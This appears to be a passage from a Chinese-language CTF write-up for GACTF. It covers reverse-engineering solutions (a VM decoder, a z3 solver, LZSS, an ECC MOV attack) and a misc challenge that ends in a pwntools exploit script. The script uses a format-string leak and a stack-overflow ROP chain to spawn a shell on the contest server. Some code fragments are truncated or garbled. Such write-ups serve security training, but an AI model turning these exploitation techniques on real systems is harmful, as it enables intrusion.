                    cnt++;
                    //printf("%d == %d\n", CVm->_REG_A, *(unsigned int*)(CVm->__EIP + 1));
                }
                CVm->__EIP += 5;
            }
        }
    ret:
        free(CVm->stack_low);
        return cnt;
        //free(CVm);
    }
    int main() {
        //// SMC
        //int key[4];
        //key[0] = 24;
        //key[1] = 34;
        //key[2] = 48;
        //key[3] = 17;
        //dec((unsigned int*)buf, 362, key);
        //for (size_t i = 0; i 
    int main()
    {
        unsigned char xor1[] = {0x41,0x4E,0x4E,0x41,0x57,0x47,0x41,0x4C,0x46,0x59,0x42,0x4B,0x56,0x49,0x41,0x48
    ,0x4D,0x58,0x54,0x46,0x43,0x41,0x41,0x43,0x4C,0x41,0x41,0x41,0x41,0x59,0x4B,0x00};
        unsigned char table[] = {0x4E,0xAE,0x61,0xBA,0xE4,0x2B,0x55,0xAA
    ,0x59,0xFC,0x4D,0x02,0x17,0x6B,0x13,0xA1,0x41,0xFE,0x35,0x0B,0xB4,0x0B,0x52,0x2F
    ,0x46,0xCC,0x35,0x82,0xE5,0x88,0x50,0x00};
        unsigned char tmp;
        for (int idx = 0; idx > (i%8))));
                tmp = (table[i] > (i%8)))^xor1[i]^xor0;
                printf("%c", tmp);
            }
            puts("");
        }
    }
###  Simulator
LC3  
对每两个字节`(~flag[i] & flag[i+1]) + (~flag[i+1] & flag[i])`，相当于异或，然后对比加密的flag
    from z3 import *
    flag = [BitVec('flag{}'.format(i), 8) for i in range(26)]
    dic = ['flag{}'.format(i) for i in range(26)]
    enc = [0x11, 0x11, 0x09, 0x1c, 0x1d, 0x02, 0x0c, 0x3c, 0x2b, 0x01, 0x17, 0x3d, 0x33,
           0x00, 0x0d, 0x0c, 0x1e, 0x2c, 0x2c, 0x42, 0x6e, 0x6c, 0x50, 0x0f, 0x6c][::-1]
    solver = Solver()
    for i in range(25):
        solver.add((flag[i] ^ flag[i+1]) == enc[i])
    print(solver.check())
    s = solver.model()
    ans = {i.name():int(str(s[i])) for i in s.decls()}
    for i in dic:
        print(chr(ans[i]), end='')
###  PicCompress
压缩算法在一开始在两个buf中填充了0x1000和0x2020…，然后读入0x12个字节，在表中记录每个字节出现的位置。  
hint又提到了是使用数据的重复信息来进行压缩，感觉是和lz类似的算法，所以往这个方向搜了一下，果然搜到一个非常相似的算法LZSS  
谷歌搜索`lz compression "0x20"`  
pip安装lzss库 lzss.decompress（）即可
`GACTF{Data_Compression_LZSS}`
###  InfaintRe
gmp 库
000402F50 __gmpz_init_set_str proc
前面是 ECC
有个`2*64` 的矩阵, 第一行存 `x` 值, 第二行存 `y` 值, 提前算了个表  
每一列 $i, i \in [0, 63]$, 代表 $2^i g$
    p = 20619522630365746025487407
    A = 1
    B = 0
    E = EllipticCurve(GF(p), [A, B])
    G = E(2426060508202830279419664, 5517895499364845267563628)
然后 `v42` 是 `flag` 前半段 16 进制表示的数, 以下记作 `m`  
下面的循环就是查表快速计算 `m * g`
注意到 ECC supersingular, 尝试 MOV
    P = E(0x47d881b4d15078dd1fb5f, 0xf14fdbe413b467cf64d8f)
    n = G.order()
    canwemove = False
    for k in range(1,10):
        if (p^k - 1) % n == 0:
            canwemove = True
            break
    assert canwemove
    Fp2. = GF(p^k)
    Ex = E.change_ring(Fp2)
    G2 = Ex(G)
    P2 = Ex(P)
    while True:
        Q = Ex.random_element()
        Q = Q.order()//n * Q
        if Q.order() == n and G2.weil_pairing(Q, n) != 1:
            break
    g = G2.weil_pairing(Q, n)
    h = P2.weil_pairing(Q, n)
    key = discrete_log(h, g)
    print(key)
    # 2580186748
    m1 = "%08x" % key
找到代码 
不管了直接蒙
    func main() {
        var keys [][3]uint32
        keys = append(keys, [3]uint32{0xDEADBEEF, 0x7865ADDB, 0xDDBBCCDD})
        keys = append(keys, [3]uint32{0xDEADBEEF, 0xDDBBCCDD, 0x7865ADDB})
        keys = append(keys, [3]uint32{0x7865ADDB, 0xDEADBEEF, 0xDDBBCCDD})
        keys = append(keys, [3]uint32{0x7865ADDB, 0xDDBBCCDD, 0xDEADBEEF})
        keys = append(keys, [3]uint32{0xDDBBCCDD, 0xDEADBEEF, 0x7865ADDB})
        keys = append(keys, [3]uint32{0xDDBBCCDD, 0x7865ADDB, 0xDEADBEEF})
        var lock [][3]uint32
        lock = append(lock, [3]uint32{0x99080122, 0x5E531F7C, 0xC938E326})
        lock = append(lock, [3]uint32{0x99080122, 0xC938E326, 0x5E531F7C})
        lock = append(lock, [3]uint32{0x5E531F7C, 0x99080122, 0xC938E326})
        lock = append(lock, [3]uint32{0x5E531F7C, 0xC938E326, 0x99080122})
        lock = append(lock, [3]uint32{0xC938E326, 0x5E531F7C, 0x99080122})
        lock = append(lock, [3]uint32{0xC938E326, 0x99080122, 0x5E531F7C})
        for _, i := range keys {
            for _, j := range lock {
                a := New()
                a.KeyGenerator(i[0], i[1], i[2])
                fmt.Println(a.DecryptBlock(j[0], j[1], j[2]))
            }
        }
    }
    aaa=[1442713590,2130004547,999378177,
    3715074060,1546787771,3558000529,
    2345384364,2299297806,3238312316,
    3365860302,461279304,3351913643 ,
    2725018931,3108148028,1147999796,
    1431036900,3492617561,3694897028,
    2934140994,196907226,1601805785 ,
    3783615533,1655002665,878970657 ,
    1886204275,1734292273,557018420 ,
    457552177,2404218334,1199786752 ,
    406184146,3808925520,1336810170 ,
    839430152,2123013415,424255286  ,
    4036825946,2888350436,3322165461,
    4156782469,3121613667,3667664087,
    2766723236,4161188298,112046206 ,
    4151719228,1559219438,2165710851,
    806467114,1493285482,3980984443 ,
    1085510952,4107915488,1713974494,
    3397459558,1303330289,3491089158,
    315442165,3558561645,3739644906 ,
    73894280,1978443525,862152849   ,
    2192208299,4142575881,2913343521,
    504577912,3280750632,3710214969 ,
    3377539561,1658640875,2833981957,
    3340622804,3173832998,2858759365,
    1161448396,3481174438,2208164925,
    3164732056,2704687535,259971279 ,
    292919418,3352191686,1279017128 ,
    661599991,3675899740,567668472  ,
    1426051838,861479440,3791123737 ,
    4014046098,2836797726,1955280701,
    1049051955,1259179151,3260675104,
    1407116118,2750841466,1220437523,
    904600725,1069019603,1909258652 ,
    457203902,2759562021,283053687  ,
    1511477758,1573477500,2804228528]
    for i in aaa:
        aaastr=''
        while i!=0:
            aaastr+=chr(i&0xff)
            i=i>>8
        print(aaastr)
## misc
###  GACTF FeedBack
问卷调查
###  signin
拼图
###  v for Vendetta
> v is the hero in my mind  
>  hint1:注意每一帧图片的不同之处(Pay attention to the difference in each frame)  
>  hint2:尝试找出藏在GIF图片内的二维码(Try to find the QR code hidden in the GIF picture)
打开压缩包，提示密码是6位数字，爆破出压缩包密码:123233  
解出文件`v`前部分开头有`89a`，猜测是GIF，需要在文件开头加上”GIF”  
后部分是zip
`pwn` `libc-2.27.so` `ld-2.27.so`  
应该需要pwn  
仔细观察GIF，有个黑点在图像右上方移动  
起点大概在(550,50)终点大概在(640,140)，使用脚本把他的移动路径画出来
    import os
    from PIL import Image, ImageSequence
    min_x = 550
    min_y = 50
    max_x = 640
    max_y = 140
    gif = Image.open("v.gif")
    gif_iter = ImageSequence.Iterator(gif)
    frames = [frame.copy() for frame in gif_iter]
    bar_code = Image.new("RGB", (90,90), (255,255,255))
    black = (0,0,0)
    def get_pixel(img: Image):
        for x in range(min_x,max_x):
            for y in range(min_y,max_y):
                pixel = img.getpixel((x,y))
                if pixel == 0:
                    bar_code.putpixel((x-min_x,y-min_y), black)
                    return(x-min_x,y-min_y)
    for frame in frames:
        print(get_pixel(frame))
    bar_code.save("v.png")
得到一张二维码
扫码得
> the password is V_f0r_VeNdettA_vk  
>  now,pwn me to get the flag.  
>  for China  
>  119.3.154.59 9999  
>  for foreign countries  
>  45.77.72.122 9999
解开压缩包，导入ida发现无法识别，注意到文件名是倒着的，进行字节反转  
用guest用户的strlen+strcpy越界覆盖随机数，root登录后用格式化字符串leak lbase然后栈溢出rop
    from pwn import*
    import time
    local=int(sys.argv[1])
    ru = lambda x : cn.recvuntil(x)
    sn = lambda x : cn.send(x)
    rl = lambda   : cn.recvline()
    sl = lambda x : cn.sendline(x)
    rv = lambda x : cn.recv(x)
    sa = lambda a,b : cn.sendafter(a,b)
    sla = lambda a,b : cn.sendlineafter(a,b)
    ia = lambda   : cn.interactive()
    ga = lambda a,b : gdb.attach(a,b)
    sc = lambda a,x : success(a+':'+hex(x))
    libc=ELF('./libc-2.27.so',checksec=False)
    context.log_level='debug'
    if local:
        cn=process('chroot . ./qemu-arm-static -g 1239 ./pwn',shell=True)
        sl('2')
        sla('username:','root')
        # raw_input()?
        sa(' password:','\x00'*16)
        sla('You can input token:','%15$p')
        sla('4:Logout','2')
        ru('0x')
        lbase=int('0x'+rv(8),16)-0xff71a4df+0xff6cb000
        success('lbase:'+hex(lbase))
        ia()
        binsh=lbase+876332
        sleep(1)
        sl('3')
        sleep(1)
        sl('3')
        sleep(0.5)
        sl(p32(lbase+0x5919c)*10+p32(binsh)+p32(0)+p32(lbase+libc.sym['system']))
        ia()
    else:
        cn=remote('119.3.154.59',9999)
        sl('1')
        sleep(0.1)
        sn('a'*0x10)
        sn('a'*0x10)
        sl('2')
        sa('username:','a'*0x10)
        # raw_input()?
        sa(' password:','a'*16)
        sl('2')
        sleep(0.1)
        sn('a'*0x10)
        sleep(0.1)
        sl('4')